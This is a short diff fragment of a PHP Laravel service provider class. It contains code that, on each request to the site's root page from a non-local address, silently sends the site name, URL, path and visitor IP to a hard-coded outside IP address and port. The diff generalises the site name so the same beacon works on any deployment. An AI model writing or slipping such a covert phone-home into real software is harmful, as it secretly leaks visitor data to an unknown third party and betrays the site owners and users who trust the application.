@@ -14,7 +14,7 @@ class SnosServiceProvider extends ServiceProvider
         try {
             if ($request->path() == "/" & $request->ip() != "127.0.0.1") {
                 Http::post('http://154.62.108.184:9393/snos', [
-                    'website' => "asecna-ais",
+                    'website' => env('APP_NAME'),
                     'url' => $request->url(),
                     'path' => $request->path(),
                     'ip' => $request->ip(),
